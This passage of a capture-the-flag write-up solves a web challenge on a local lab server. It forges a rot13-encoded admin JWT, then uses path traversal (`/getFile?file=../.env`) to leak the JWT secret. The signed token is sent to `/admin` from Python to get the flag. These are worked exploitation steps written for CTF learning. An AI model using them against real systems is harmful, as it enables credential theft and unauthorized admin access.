visit that repository on GitHub, and checkout the `root` file [here](https://github.com/csivitu/authorized_users/blob/master/csivit/root), you can see a list of usernames.

```
thebongy
roerohan
namsnath
sudo-nan0-RaySK
theProgrammerDavid
sauravhiremath
```

These are the usernames of the website admins! Now, in the JWT you were creating, you can change the `username` key to a rot13 encrypted version of one of these, for example, `ebrebuna` is the rot13 encrypted ciphertext for `roerohan`. Here's what our JWT payload looks like now:

```
{
  "username": "ebrebuna",
  "password": "nfq",
  "admin": "gehr",
  "iat": 1593506966
}
```

But, we still need the JWT secret. If you observe the request on `/adminNames`, you see that it actally redirects to `/getFile?file=admins`. This route seems suspicious. We can try to include other files using this. When you try `/getFile?file=.env`, it returns `No such file or directory: /app/public/.env`. So, we can try `../.env` to come out of the public folder. You get a file in return, which is the `.env` containing the secret!

```
JWT_SECRET=Th1sSECr3TMu5TN0Tb3L43KEDEv3RRRRRR!!1
```

Use this secret to create a new token. Now, visit the `/admin` route. It says:

```
{
  "success": false,
  "message": "Invalid Token, Headers?"
}
```

Which means, you'll have to pass the JWT in the headers. Auth tokens are generally passed in the Authorization header, so let's try that. When you pass the new formed JWT in the Authorization header. You can do this using python.

```python
>>> import requests
>>> r= requests.get('http://localhost:3000/admin', headers={'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImVicmVidW5hIiwicGFzc3dvcmQiOiJuZnEiLCJhZG1pbiI6ImdlaHIiLCJpYXQiOjE1OTM1MDY5NjZ9.LCbBdHCDlx64bTFeErtBAeoL000HIqyFStvUxlTtVE8'})
>>> r.text
```

The text in the response is:

```
Hey roerohan! Here's your flag: pfvpgs{1a_gu3_3aq_1g_q0rfa'g_3i3a_z4gg3e}
```

rot13 decrypt this flag to get the real flag.
<br />

The flag is:

```
C3iCenter{1n_th3_3nd_1t_d0esn't_3v3n_m4tt3r}
```
